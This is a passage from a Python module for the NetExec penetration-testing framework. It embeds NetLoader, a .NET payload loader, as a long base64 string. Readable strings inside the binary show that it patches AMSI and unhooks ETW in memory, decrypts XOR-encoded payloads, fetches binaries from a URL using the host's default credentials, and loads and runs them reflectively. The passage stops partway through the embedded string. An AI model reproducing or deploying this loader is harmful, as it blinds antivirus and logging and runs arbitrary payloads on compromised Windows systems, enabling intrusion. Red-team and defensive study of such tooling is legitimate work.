# netload module for nxc
# author of the module : github.com/Squ1shification
# NetLoader: https://github.com/Flangvik/NetLoader

import base64
from io import BytesIO
from sys import exit as sys_exit

from nxc.helpers.misc import CATEGORY, gen_random_string


EMBEDDED_LOADER = (
    "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1v"
    "ZGUuDQ0KJAAAAAAAAABQRQAATAEDAAAAAAAAAAAAAAAAAOAAAgELAQgAACgAAAAGAAAAAAAAvkcA"
    "AAAgAAAAYAAAAABAAAAgAAAAAgAABAAAAAAAAAAEAAAAAAAAAACgAAAAAgAAAAAAAAMAQIUAABAA"
    "ABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAAHBHAABLAAAAAGAAABADAAAAAAAAAAAAAAAAAAAA"
    "AAAAAIAAAAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAIAAACAAAAAAAAAAAAAAACCAAAEgAAAAAAAAAAAAAAC50ZXh0AAAAxCcAAAAgAAAAKAAAAAIA"
    "AAAAAAAAAAAAAAAAACAAAGAucnNyYwAAABADAAAAYAAAAAQAAAAqAAAAAAAAAAAAAAAAAABAAABA"
    "LnJlbG9jAAAMAAAAAIAAAAACAAAALgAAAAAAAAAAAAAAAAAAQAAAQgAAAAAAAAAAAAAAAAAAAACg"
    "RwAAAAAAAEgAAAACAAUA6CoAAIAcAAABAAAACAAABgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAB4CKEUAAAoqGzACAHgAAAABAAARKAEAAApvAgAACgoGbwMA"
    "AAoMODMAAAAIbwQAAAp0AwAAAQsHbwUAAApvBgAACgJvBgAACm8HAAAKOQwAAAAHbwgAAAoN3SwA"
    "AAAIbwkAAAo6wv///90WAAAACHUHAAABJRMEOQcAAAARBG8KAAAK3H4LAAAKKgkqARAAAAIAEgBI"
    "WgAWAAAAABswBAACAgAAAgAAEX4LAAAKCg8AKAwAAAofPGpYKA0AAAooDgAACgsPACgMAAAKB2pY"
    "HxRqWCgNAAAKKA8AAAoMDwAoDAAACgdqWB8YalgNCSgNAAAKKA8AAAoTBBZqEwURBCALAQAAQAwA"
    "AAAJH2BqWBMFOAcAAAAJH3BqWBMFEQUoDQAACigOAAAKEwYPACgMAAAKEQZqWB8QalgoDQAACigO"
    "AAAKEwcPACgMAAAKEQZqWB8UalgoDQAACigOAAAKEwgPACgMAAAKEQZqWB8YalgoDQAACigOAAAK"
    "EwkPACgMAAAKEQZqWB8calgoDQAACigOAAAKEwoPACgMAAAKEQZqWB8galgoDQAACigOAAAKEwsP"
    "ACgMAAAKEQZqWB8kalgoDQAACigOAAAKEwwWEw04mQAAAA8AKAwAAAoPACgMAAAKEQtqWBENGlpq"
    "WCgNAAAKKA4AAApqWCgNAAAKKBAAAAoTDhEOAxtvEQAACjlVAAAADwAoDAAAChEMalgRDRhaalgo"
    "DQAACigPAAAKEQdYEw8PACgMAAAKEQpqWBoRDxEHWVpqWCgNAAAKKA4AAAoTEAIoEgAAChEQalgo"
    "DQAACgrdDwAAABENF1gTDRENEQk/Xv///90MAAAAJnIBAABwcxMAAAp6Bn4LAAAKKBQAAAo5EQAA"
    "AANyQQAAcCgVAAAKcxYAAAp6BioAAEEcAAAAAAAABgAAAM0BAADTAQAADAAAAAsAAAETMAIAMAAA"
    "AAMAABECKAIAAAYKBn4LAAAKKBQAAAo5EQAAAAJyaQAAcCgVAAAKcxcAAAp6BgMoAwAABioTMAMA"
    "EgAAAAMAABECAxYoBAAABgoGBAUoBgAABioAABMwAgARAAAABAAAEQIDKBgAAAoKBgRQbxkAAAoq"
    "AAAAEzAHAEIAAAAFAAARAo5pjREAAAEKFgs4JwAAAAYHAgeRKBoAAAoDbxsAAAoHKBoAAAoDbxsA"
    "AAqOaV2RYdKcBxdYCwcCjmk/0P///wYqAAATMAUANAIAAAYAABEoCQAABigcAAAGcpMAAHAKFo0G"
    "AAABCxYMFg1ykwAAcBMEcpUAAHAoHQAACnKdAABwKB0AAApaEwUCjmkWPvEBAAACEwcWEwg4swEA"
    "ABEHEQiaEwYRBm8GAAAKcqEAAHAoHgAACjoWAAAAEQZvBgAACnKtAABwKB4AAAo5DAAAABcMcrcA"
    "AHAoHwAAChEGbwYAAApyNQEAcCgeAAAKOhYAAAARBm8GAAAKcj8BAHAoHgAACjlMAAAAFw0CEQYo"
    "AQAAKxdYEwkRCQKOaTwoAAAAAhEJmhMKCDkYAAAAKBoAAAoRCighAAAKbyIAAAoTBDgEAAAAEQoT"
    "BHJLAQBwEQQoIwAAChEGbwYAAApyswEAcCgeAAAKOhYAAAARBm8GAAAKcr8BAHAoHgAACjk8AAAA"
    "AhEGKAEAACsXWBMLEQsCjmk8JgAAAAIRC5oTDAg5FwAAACgaAAAKEQwoIQAACm8iAAAKCjgDAAAA"
    "EQwKEQZvBgAACnLNAQBwKB4AAAo6FgAAABEGbwYAAApy2QEAcCgeAAAKOWIAAAACEQYoAQAAKxdY"
    "Ew0CjmkRDVkTDhEOjQYAAAELFhMPODUAAAACEQ0RD1iaExAIORoAAAAHEQ8oGgAAChEQKCEAAApv"
    "IgAACqI4BgAAAAcRDxEQohEPF1gTDxEPEQ4/wv///xEIF1gTCBEIEQeOaT9C/v//BigkAAAKOQsA"
    "AAAoDAAABhYoJQAACgYHCREEEQUoGAAABhYoJQAACioTMAUAbQAAAAcAABFy5wEAcHL7AQBwFigE"
    "AAAGCnIXAgBwcjECAHAWKAQAAAYLB9AEAAACKCYAAAooGAAACnQEAAACDCgRAAAGDQgGCY5paign"
    "AAAKH0ASBG8jAAAGORUAAAAJFgYJjmkoKAAACnJPAgBwKB8AAAoq6gM5EgAAACgaAAAKAighAAAK"
    "byIAAAoQAAJvKQAACm8GAAAKco0CAHBvKgAACjkGAAAAFiglAAAKAipSAh9YQAYAAAAWKCUAAAoC"
    "H1n+ASr2cpECAHAoHwAACnKhAgBwKB8AAApyLAMAcCgfAAAKct8DAHAoHwAACnLOBABwKB8AAApy"
    "jQUAcCgfAAAKKh4CKCsAAAoqABswBAA8AAAACAAAERQKAgMXcywAAAoLB28tAAAK1I0RAAABCgcG"
    "FgdvLQAACmlvLgAACibdDQAAAAc5BgAAAAdvCgAACtwGKgEQAAACAAsAIi0ADQAAAAATMAMAZQAA"
    "AAkAABFyFwIAcHKEBgBwFigEAAAGCnIXAgBwcqIGAHAWKAQAAAYLBtADAAACKCYAAAooGAAACnQD"
    "AAACDAfQBQAAAigmAAAKKBgAAAp0BQAAAg0ICXK8BgBwbycAAAZyzgYAcG8fAAAGKj4oLwAAChpA"
    "AgAAABYqFyqCKBAAAAY6CwAAAHLsBgBwKCEAAAoqcvYGAHAoIQAACiqCKBAAAAY6CwAAAHIABwBw"
    "KCEAAAoqchoHAHAoIQAACioeAm8wAAAKKsYCKBMAAAYCbzAAAAooMQAACjkNAAAAAhR+AQAABG8y"
    "AAAKJigzAAAKJn4BAAAEFpoqAAAAEzACAEcAAAAKAAARAig0AAAKdCIAAAEKBm81AAAKKDYAAApv"
    "NwAACgZyLAcAcG84AAAKBm85AAAKC3M6AAAKDAdvOwAACghvPAAACghvPQAACioiAig+AAAKAioe"
    "Am8/AAAKKhMwBQACAQAAAAAAAA4EKBYAAAYmcjQHAHADKEAAAAooJAAACjolAAAAcjgHAHACclgH"
    "AHByNAcAcAMoQAAACihBAAAKKB8AAAo4IAAAAHI4BwBwAnJYBwBwcjQHAHADKEAAAAooQQAACigf"
    "AAAKF40LAAABJRYDooABAAAEBDkmAAAAAm8GAAAKcnQHAHBvQgAACjkRAAAAAigVAAAGBSgZAAAG"
    "OGQAAAAEOiUAAAACbwYAAApydAcAcG9CAAAKORAAAAACKBUAAAYoGgAABjg5AAAABDomAAAAAm8G"
    "AAAKcnQHAHBvQgAACjoRAAAAAhkoDgAABigaAAAGOA0AAAACGSgOAAAGBSgZAAAGKmICAygHAAAG"
    "KA0AAAYoFwAABigUAAAGJipKAigNAAAGKBcAAAYoFAAABiYqAAATMAUATwAAAAsAABFyFwIAcHIx"
    "AgBwFigEAAAGCgbQBAAAAigmAAAKKBgAAAp0BAAAAgsWDAcCKBIAAAaOaWooJwAACh9AEgJvIwAA"
    "BjkCAAAAAioWKEMAAAoqABMwBABJAAAAAwAAESgPAAAGKBsAAAYKBhYoQwAACihEAAAKOSIAAAAo"
    "EgAABhYGKBIAAAaOaSgoAAAKcn4HAHAoHwAACjgKAAAAcrwHAHAoHwAACioeFIABAAAEKgAAAEJT"
    "SkIBAAEAAAAAAAwAAAB2NC4wLjMwMzE5AAAAAAUAbAAAAMAHAAAjfgAALAgAAGwJAAAjU3RyaW5n"
    "cwAAAACYEQAA8AcAACNVUwCIGQAAEAAAACNHVUlEAAAAmBkAAOgCAAAjQmxvYgAAAAAAAAACAAAQ"
    "Vx0CAAkKAAAA+gEzABYAAAEAAAAwAAAABQAAAAEAAAApAAAAQgAAAEYAAAACAAAABAAAAAsAAAAB"
    "AAAAAgAAAAMAAAABAAAAAABVCQEAAAAAAAYAUQBpAAYAfABpAAYAogBpAAoAsAC8AAoAzwC8AAoA"
    "DQEUAQoARQEUAQoAWQEUAQoAjwGXAQoA4QEUAQoA8gEUAQoA+QEUAQoALAIUAQoAYAIUAQoApQIU"
    "AQoAzAIUAQoA8wIUAQoA+AIBAwoAHwOXAQoAQQOXAQoAAQQUAQoAEQQUAQoAIwQUAQoAWgQUAQoA"
    "fQQUAQoAjwQUAQoAwwTMBAoA9QQABQoACgUABQoAEwUABQoAHgUABQoASQXMBAoAZgXMBAYAhQWU"
    "BQYAnwWUBQYAuwWUBQYAxQWUBQYA7AWUBQYAFAaUBQoALAYABQYAYgaUBQYAiwaUBQoAswbMBAoA"
    "zAcUAQoAxAgUAQoA0QgUAQoA6QgUAQoADgksCQAAAAABAAAAAAABAAEAAQAQAAoAAAAtAAEAAQAC"
    "AQAAFAAAAL0AAgAeAAIBAAAjAAAAvQACACIAAgEAADIAAAC9AAIAJgARAD4AAQBQIAAAAACGGBMC"
    "KQABAFggAAAAAJYAJQdoAQEA7CAAAAAAlgA8B3kBAgAYIwAAAACWAE0HkwEEAFQjAAAAAJYAXwee"
    "AQcAdCMAAAAAlgBwB6kBCwCUIwAAAACRAIYHuAEOAOQjAAAAAJYAkAfGARAAJCYAAAAAkQCVB+IB"
    "EQCdJgAAAACRAJ4H8AERANgmAAAAAJEAtgf2ARMA7SYAAAAAkQDXB+IBFAArJwAAAACRAOEH3gAU"
    "ADQnAAAAAJEA6Qf9ARUAjCcAAAAAkQD7BwwCFwD9JwAAAACRAAsIGQIXAA0oAAAAAJEAEwgdAhcA"
    "LigAAAAAkQAhCB0CFwBPKAAAAACRADAIIgIXAFcoAAAAAJEAPQgqAhgAjCgAAAAAkQBQCK0AGQDf"
    "KAAAAACWAFwIPQIaAOgoAAAAAJEAawhCAhsA8CgAAAAAkQB5CEoCHAD+KQAAAACRAIgIVAIhABcq"
    "AAAAAJEAkghbAiMALCoAAAAAkQCeCGECJACIKgAAAACRAKgI4gElAN0qAAAAAJEYsQjiASUAAAAA"
    "AAMAhhgTAm0CJQAAAAAAAwDGAXEFcwInAAAAAAADAMYBuAh5AikAAAAAAAMAxgHfCIUCLQAAAAAA"
    "AwCGGBMCbQIuAAAAAAADAMYBcQWMAjAAAAAAAAMAxgG4CJUCNAAAAAAAAwDGAd8IpAI6AAAAAAAD"
    "AIYYEwJtAjwAAAAAAAMAxgFxBa0CPgAAAAAAAwDGAbgIsgI/AAAAAAADAMYB3wiFAkIAAAABAEkA"
    "AAABAGUBAAACAHABAAABAEkAAAACAEMCEBADAFACAAABAEkAAAACAEMCAAADAHUCAAAEAIoCAAAB"
    "AJUCAAACAHUCAAADAIoCAAABAN8CAAACAOkCAAABAPwDAAABAN8CAAACAJwEAAABAK4EAAABALkE"
    "AAABAOMEAAACAOwEAAABAD4FAAABAD4FAAABAIEFAAABAFoGAAABAKAGAAABAL4GAAACAM8GAAAD"
    "ANkGAAAEAOQGEBAFAOsGAAABAAcHAAACAOQGAAABAAcHAAABAAwHAAABAFMDAAACAFoDAAABAGED"
    "AAACAHADAAABAGEDAAACAHADAAADAIIDAAAEAFMDAAABAIsDAAABAFMDAAACAFoDAAABAJIDAAAC"
    "AKMDAAADALkDAgAEANQDAAABAJIDAAACAKMDAAADALkDAgAEANQDAAAFAIIDAAAGAFMDAgABANQD"
    "AAACAIsDAAABAFMDAAACAFoDAAABAOgDAAABAOgDAAACAIIDAAADAFMDAAABAIsDEQCEAAUAEQCW"
    "AAoAKQDmAA8AIQD0ABQAGQAAARgAMQAbARgAMQAjARwAGQAsASEAIQA8ASUAOQBRASkAQQBgAS0A"
    "QQB7ATAAQQCDATQASQC2ATkASQDAAT4ASQDKAUMAMQDaAUgAQQCDAU8AYQATAlQAQQAZAlkAMQAl"
    "Al8AaQATAlQAcQATAlQASQCuAmcAeQDRAm8AkQANA3UAkQAWA3oAmQATAoAAqQAJBI8AMQAZApQA"
    "sQAZBJoAuQApBJ8AqQAxBK0AkQBCBLMAsQAZBLkAMQBMBL8AwQBmBMQAgQBrBMkA0QCDAdAASQCX"
    "BNUAMQCpBBgAMQDaARwA2QDeBN4A4QATAuUA+QAlBTAA+QAwBe4AQQA1BfYAAQFUBfoAgQAZAv8A"
    "CQFxBQcBsQB4BQ4BGQGqBRIBGQGxBRkBKQHVBR8BIQH5BSUBGQEJBlQAGQEgBiwBQQETAikAOQE5"
    "BjIB+QBLBjcBQQFSBj0BSQF2BkIB2QCkBkkBMQD3BlQBMQAlAlsBMQD8BhwAQQCDAWMBQQAXB1kA"
    "WQATAikAgQETAikAAgAZAGUACACBAE8BLgAzAr0CYwDjAIYAgwDjAIYAowDjAIYAbQF/AZoBswHA"
    "AcwB5gEFAhACMQJmAgSAAAAAAAAAAAAAAAAAAAAAAPsIAAAEAAAAAAAAAAAAAADcAhQBAAAAAAQA"
    "AAAAAAAAAAAAANwCTAkAAAAAAwACAAQAAgAFAAIAQQCpAAAAAAAAPE1vZHVsZT4ATmV0TG9hZGVy"
    "AEdldFByb2NBZGRyZXNzAFZpcnR1YWxQcm90ZWN0AExvYWRMaWJyYXJ5AGdsb2JhbEFyZ3MARExM"
    "TmFtZQBQcm9jZXNzTW9kdWxlQ29sbGVjdGlvbgBTeXN0ZW0uRGlhZ25vc3RpY3MAUHJvY2VzcwBH"
    "ZXRDdXJyZW50UHJvY2VzcwBnZXRfTW9kdWxlcwBQcm9jZXNzTW9kdWxlAElFbnVtZXJhdG9yAFN5"
    "c3RlbS5Db2xsZWN0aW9ucwBSZWFkT25seUNvbGxlY3Rpb25CYXNlAEdldEVudW1lcmF0b3IAZ2V0"
    "X0N1cnJlbnQAZ2V0X0ZpbGVOYW1lAFN0cmluZwBTeXN0ZW0AVG9Mb3dlcgBFbmRzV2l0aABnZXRf"
    "QmFzZUFkZHJlc3MATW92ZU5leHQASURpc3Bvc2FibGUARGlzcG9zZQBJbnRQdHIAWmVybwBNb2R1"
    "bGVCYXNlAEV4cG9ydE5hbWUAVG9JbnQ2NABvcF9FeHBsaWNpdABNYXJzaGFsAFN5c3RlbS5SdW50"
    "aW1lLkludGVyb3BTZXJ2aWNlcwBSZWFkSW50MzIAUmVhZEludDE2AFB0clRvU3RyaW5nQW5zaQBF"
    "cXVhbHMAU3RyaW5nQ29tcGFyaXNvbgBPYmplY3QASW52YWxpZE9wZXJhdGlvbkV4Y2VwdGlvbgAu"
    "Y3RvcgBvcF9FcXVhbGl0eQBDb25jYXQATWlzc2luZ01ldGhvZEV4Y2VwdGlvbgBGdW5jdGlvbk5h"
    "bWUAQ2FuTG9hZEZyb21EaXNrAERsbE5vdEZvdW5kRXhjZXB0aW9uAEZ1bmN0aW9uRGVsZWdhdGVU"
    "eXBlAFBhcmFtZXRlcnMARnVuY3Rpb25Qb2ludGVyAERlbGVnYXRlAEdldERlbGVnYXRlRm9yRnVu"
    "Y3Rpb25Qb2ludGVyAFR5cGUARHluYW1pY0ludm9rZQBpbnB1dERhdGEAa2V5UGhyYXNlAEJ5dGUA"
    "RW5jb2RpbmcAU3lzdGVtLlRleHQAZ2V0X1VURjgAR2V0Qnl0ZXMAVW5tYW5hZ2VkRnVuY3Rpb25Q"
    "b2ludGVyQXR0cmlidXRlAENhbGxpbmdDb252ZW50aW9uAG9iamVjdABtZXRob2QAVXJldGhyYWxn"
    "aWFPcmMASHlwb3N0b21vdXNCdXJpZWQAY2FsbGJhY2sAcmVzdWx0AEdob3N0d3JpdGluZ05hcmQA"
    "Tm9udGFidWxhcmx5QmFua3NoYWxsAFlvaGltYmluaXphdGlvblVuaW5zY3JpYmVkAFp5Z29zaXND"
    "b29yZGluYXRpb24ATGlvZGVybWlhR3JhbnVsYXRlcgBhcmdzAENvbnZlcnQAVG9JbnQzMgBDb25z"
    "b2xlAFdyaXRlTGluZQBBcnJheQBJbmRleE9mAEZyb21CYXNlNjRTdHJpbmcAR2V0U3RyaW5nAElz"
    "TnVsbE9yRW1wdHkARW52aXJvbm1lbnQARXhpdABHZXRUeXBlRnJvbUhhbmRsZQBSdW50aW1lVHlw"
    "ZUhhbmRsZQBVSW50UHRyAENvcHkAYmFzZTY0RGVjb2RlAFRyaW0AY29uc29sZUtleQBieXRlQXJy"
    "YXkAQXNzZW1ibHkAU3lzdGVtLlJlZmxlY3Rpb24ATG9hZABmaWxlUGF0aABmaWxlTW9kZQBGaWxl"
    "U3RyZWFtAFN5c3RlbS5JTwBGaWxlTW9kZQBGaWxlQWNjZXNzAFN0cmVhbQBnZXRfTGVuZ3RoAFJl"
    "YWQAZ2V0X1NpemUAbWV0aG9kSW5mbwBNZW1iZXJJbmZvAGdldF9SZWZsZWN0ZWRUeXBlAE1ldGhv"
    "ZEJhc2UASW52b2tlAFJlYWRMaW5lAHVybABIdHRwV2ViUmVxdWVzdABTeXN0ZW0uTmV0AFdlYlJl"
    "cXVlc3QAQ3JlYXRlAGdldF9Qcm94eQBJV2ViUHJveHkAQ3JlZGVudGlhbENhY2hlAGdldF9EZWZh"
    "dWx0Q3JlZGVudGlhbHMASUNyZWRlbnRpYWxzAHNldF9DcmVkZW50aWFscwBzZXRfTWV0aG9kAFdl"
    "YlJlc3BvbnNlAEdldFJlc3BvbnNlAE1lbW9yeVN0cmVhbQBHZXRSZXNwb25zZVN0cmVhbQBDb3B5"
    "VG8AVG9BcnJheQBzZWNQcm90AFNlcnZpY2VQb2ludE1hbmFnZXIAc2V0X1NlY3VyaXR5UHJvdG9j"
    "b2wAU2VjdXJpdHlQcm90b2NvbFR5cGUAYXNtAGdldF9FbnRyeVBvaW50AE1ldGhvZEluZm8AcGF5"
    "bG9hZFBhdGhPclVSTABpbnB1dEFyZ3MAeG9yRW5jb2RlZAB4b3JLZXkAc2V0UHJvdFR5cGUASm9p"
    "bgBTdGFydHNXaXRoAGRhdGEAYW1zaUxpYlB0cgBvcF9JbmVxdWFsaXR5AEdldExvYWRlZE1vZHVs"
    "ZUFkZHJlc3MAR2V0RXhwb3J0QWRkcmVzcwBHZXRMaWJyYXJ5QWRkcmVzcwBEeW5hbWljQVBJSW52"
    "b2tlAER5bmFtaWNGdW5jdGlvbkludm9rZQB4b3JFbmNEZWMATWFpbgBQYXRjaEVUVwBwYXJzZVN0"
    "cmluZ0NvbnNvbGVJbnB1dABwYXJzZUJvb2xDb25zb2xlSW5wdXQAQ29uc29sZUtleQBwcmludEhl"
    "bHAAbG9hZEFTTQByZWFkTG9jYWxGaWxlUGF0aABnZXRBTVNJTG9jYXRpb24AaXM2NEJpdABnZXRF"
    "VFdQYXlsb2FkAGdldEFNU0lQYXlsb2FkAGp1bmtGdW5jdGlvbgBpbnZva2VDU2hhcnBNZXRob2QA"
    "ZG93bmxvYWRVUkwAc2V0UHJvdG9jb2xUTFMAZ2V0RW50cnlQb2ludABUcmlnZ2VyUGF5bG9hZABl"
    "bmNEZXBsb3kAdW5FbmNEZXBsb3kAdW5Qcm90ZWN0AFBhdGhBTVNJAC5jY3RvcgBCZWdpbkludm9r"
    "ZQBJQXN5bmNSZXN1bHQAQXN5bmNDYWxsYmFjawBFbmRJbnZva2UATXVsdGljYXN0RGVsZWdhdGUA"
    "TmV0TG9hZGVyX29yaWdpbmFsAFJ1bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAFN5c3RlbS5S"
    "dW50aW1lLkNvbXBpbGVyU2VydmljZXMAbXNjb3JsaWIATmV0TG9hZGVyX29yaWdpbmFsLmV4ZQAA"
    "P0YAYQBpAGwAZQBkACAAdABvACAAcABhAHIAcwBlACAAbQBvAGQAdQBsAGUAIABlAHgAcABvAHIA"
    "dABzAC4AACcsACAAZQB4AHAAbwByAHQAIABuAG8AdAAgAGYAbwB1AG4AZAAuAAApLAAgAEQAbABs"
    "ACAAdwBhAHMAIABuAG8AdAAgAGYAbwB1AG4AZAAuAAABAAczADgANAAAAzgAAAstAC0AYgA2ADQA"
    "AAktAGIANgA0AAB9WwArAF0AIABBAGwAbAAgAGEAcgBnAHUAbQBlAG4AdABzACAAYQByAGUAIABC"
    "AGEAcwBlADYANAAgAGUAbgBjAG8AZABlAGQALAAgAGQAZQBjAG8AZABpAG4AZwAgAHQAaABlAG0A"
    "IABvAG4AIAB0AGgAZQAgAGYAbAB5AAAJLQB4AG8AcgAACy0ALQB4AG8AcgAAZ1sAKwBdACAARABl"
    "AGMAcgB5AHAAdABpAG4AZwAgAFgATwBSACAAZQBuAGMAcgB5AHAAdABlAGQAIABiAGkAbgBhAHIA"
    "eQAgAHUAcwBpAG4AZwAgAGsAZQB5ACAAJwB7ADAAfQAnAAALLQBwAGEAdABoAAANLQAtAHAAYQB0"
    "AGgAAAstAGEAcgBnAHMAAA0tAC0AYQByAGcAcwAAE24AdABkAGwAbAAuAGQAbABsAAAbRQB0AHcA"
    "RQB2AGUAbgB0AFcAcgBpAHQAZQAAGWsAZQByAG4AZQBsADMAMgAuAGQAbABzAAAdVgBpAHIAdAB1"
    "AGEAbABQAHIAbwB0AGUAYwB0AAA9WwArAF0AIABTAHUAYwBjAGUAcwBzAGYAdQBsAGwAeQAgAHUA"
    "bgBoAG8AbwBrAGUAZAAgAEUAVABXACEAAAN4AAAPVQBzAGEAZwBlADoAIAAAgIlVAHMAYQBnAGUA"
    "OgAgAFsALQBiADYANABdACAAWwAtAHgAbwByACAAPABrAGUAeQA+AF0AIAAtAHAAYQB0AGgAIAA8"
    "AGIAaQBuAGEAcgB5AF8AcABhAHQAaAA+ACAAWwAtAGEAcgBnAHMAIAA8AGIAaQBuAGEAcgB5AF8A"
    "YQByAGcAcwA+AF0AAICxCQAtAGIANgA0ADoAIABPAHAAdABpAG8AbgBuAGEAbAAgAGYAbABhAGcA"
    "IABwAGEAcgBhAG0AZQB0AGUAcgAgAGkAbgBkAGkAYwBhAHQAaQBuAGcAIAB0AGgAYQB0ACAAYQBs"
    "AGwAIABvAHQAaABlAHIAIABwAGEAcgBhAG0AZQB0AGUAcgBzACAAYQByAGUAIABiAGEAcwBlADYA"
    "NAAgAGUAbgBjAG8AZABlAGQALgAAgO0JAC0AeABvAHIAOgAgAE8AcAB0AGkAbwBuAG4AYQBsACAA"
    "cABhAHIAYQBtAGUAdABlAHIAIABpAG4AZABpAGMAYQB0AGkAbgBnACAAdABoAGEAdAAgAGIAaQBu"
    "AGEAcgB5ACAAZgBpAGwAZQBzACAAYQByAGUAIABYAE8AUgAgAGUAbgBjAHIAeQBwAHQAZQBkAC4A"
    "IABNAHUAcwB0ACAAYgBlACAAZgBvAGwAbABvAHcAZQBkACAAYgB5ACAAdABoAGUAIABYAE8AUgAg"
    "AGQAZQBjAHIAeQBwAHQAaQBvAG4AIABrAGUAeQAuAACAvQkALQBwAGEAdABoADoAIABNAGEAbgBk"
    "AGEAdABvAHIAeQAgAHAAYQByAGEAbQBlAHQAZQByAC4AIABJAG4AZABpAGMAYQB0AGUAcwAgAHQA"
    "aABlACAAcABhAHQAaAAsACAAZQBpAHQAaABlAHIAIABsAG8AYwBhAGwAIABvAHIAIABhACAAVQBS"
    "AEwALAAgAG8AZgAgAHQAaABlACAAYgBpAG4AYQByAHkAIAB0AG8AIABsAG8AYQBkAC4AAID1CQAt"
    "AGEAcgBnAHMAOgAgAE8AcAB0AGkAbwBuAG4AYQBsACAAcABhAHIAYQBtAGUAdABlAHIAIAB1AHMA"
    "ZQBkACAAdABvACAAcABhAHMAcwAgAGEAcgBnAHUAbQBlAG4AdABzACAAdABvACAAdABoAGUAIABs"
    "AG8AYQBkAGUAZAAgAGIAaQBuAGEAcgB5AC4AIABNAHUAcwB0ACAAYgBlACAAZgBvAGwAbABvAHcA"
    "ZQBkACAAYgB5ACAAYQBsAGwAIABhAHIAZwB1AG0AZQBuAHQAcwAgAGYAbwByACAAdABoAGUAIABi"
    "AGkAbgBhAHIAeQAuAAAdRwBlAHQAUAByAG8AYwBBAGQAZAByAGUAcwBzAAAZTABvAGEAZABMAGkA"
    "YgByAGEAcgB5AEEAABFhAG0AcwBpAC4AZABsAGwAAB1BAG0AcwBpAFMAYwBhAG4AQgB1AGYAZgBl"
    "AHIAAAl3AGgAUQBBAAAJdwB3AD0APQAAGXUARgBjAEEAQgA0AEQAQwBHAEEAQQA9AAARdQBGAGMA"
    "QQBCADQARABEAAAHRwBFAFQAAAMgAAAfWwArAF0AIABVAFIATAAvAFAAQQBUAEgAIAA6ACAAABsg"
    "AEEAcgBnAHUAbQBlAG4AdABzACAAOgAgAAAJaAB0AHQAcAAAPVsAKwBdACAAUwB1AGMAYwBlAHMA"
    "cwBmAHUAbABsAHkAIABwAGEAdABjAGgAZQBkACAAQQBNAFMASQAhAAAxWwAhAF0AIABQAGEAdABj"
    "AGgAaQBuAGcAIABBAE0AUwBJACAARgBBAEkATABFAEQAAAAA4991BC8vzEC8wUh9c5qhawADBh0c"
    "BAAAEgkEIAASBQQgABIRAyAAHAMgAA4EIAECDgMgABgDIAACAyAAAQIGGAMgAAoEAAEYCgQAAQgY"
    "BAABBhgEAAEOGAYgAgIOESkEAAEKGAQgAQEOBQACAhgYBQACDg4OAQAHAAISPRgSQQUgARwdHAQA"
    "ABJJBSABHQUOBSABARFRCAEAAwAAAAAABAABCA4FAAICDg4EAAEBDgkQAQIIHR4AHgADCgEOBQAB"
    "HQUOBSABDh0FBQACAQ4cBAABAg4EAAEBCAYAARJBEWUEAAEZCwgABAEdBQgYCAYAARJtHQUIIAMB"
    "DhF1EXkHIAMIHQUICAMAAAgEIAASQQcAAgISQRJBBiACHBwdHAMAAA4GAAESgI0OBSAAEoCRBQAA"
    "EoCZBiABARKAmQUgABKAnQQgABJ9BSABARJ9BCAAHQUGAAEBEYCpBSAAEoCtBAAAAAAGAAIODh0O"
    "BwAEDg4ODg4EAAEYCAQAARgOCwcFEgUSDRIRGBIdBQACGBgOEwcRGAgGCgYKCAgICAgICAgOCAgG"
    "AAMYDg4CAwcBGAoABBwODhJBEB0cCQADHBgSQRAdHAQHARI9BwACHQUdBQ4FBwIdBQgFAAEBHQ4V"
    "BxEOHQ4CAg4IDh0OCAgOCA4ICAgOAwAAAQkHBRgYEhAdBQkFAAIODgIGAAECEYCxBwACHQUOEXUG"
    "BwIdBRJxAwAAGAgHBBgYEgwSFAMAAAIEAAAdBQcAARJBEoCtBgABHBKArQsHAxKAiRKAnRKAoQQA"
    "AQgIBwABEoCtEm0JAAUBDh0OAg4IBgACAR0FDgUAAQEdBQQAARgYBgcDGBIQCQUgAgEcGAUgAhgY"
    "DgsgBBKAtRgOEoC5HAYgARgSgLUIIAQCGBkJEAkOIAYSgLUYGQkQCRKAuRwIIAICEAkSgLUEIAEY"
    "DgogAxKAtQ4SgLkcHgEAAQBUAhZXcmFwTm9uRXhjZXB0aW9uVGhyb3dzAQi3elxWGTTgiQAAAAAA"
    "AAAAAAAAmEcAAAAAAAAAAAAArkcAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKBHAAAAAAAAAABf"
    "Q29yRXhlTWFpbgBtc2NvcmVlLmRsbAAAAAAA/yUAIEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABABAAAAAY"
    "AACAAAAAAAAAAAAAAAAAAAABAAEAAAAwAACAAAAAAAAAAAAAAAAAAAABAAAAAABIAAAAWGAAALgC"
    "AAAAAAAAAAAAALgCNAAAAFYAUwBfAFYARQBSAFMASQBPAE4AXwBJAE4ARgBPAAAAAAC9BO/+AAAB"
    "AAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAQAAAACAAAAAAAAAAAAAAAAAAAARAAAAAEAVgBhAHIA"
    "RgBpAGwAZQBJAG4AZgBvAAAAAAAkAAQAAABUAHIAYQBuAHMAbABhAHQAaQBvAG4AAAAAAH8AsAQY"
    "AgAAAQBTAHQAcgBpAG4AZwBGAGkAbABlAEkAbgBmAG8AAAD0AQAAAQAwADAANwBmADAANABiADAA"
    "AAAcAAIAAQBDAG8AbQBtAGUAbgB0AHMAAAAgAAAAJAACAAEAQwBvAG0AcABhAG4AeQBOAGEAbQBl"
    "AAAAAAAgAAAALAACAAEARgBpAGwAZQBEAGUAcwBjAHIAaQBwAHQAaQBvAG4AAAAAACAAAAAwAAgA"
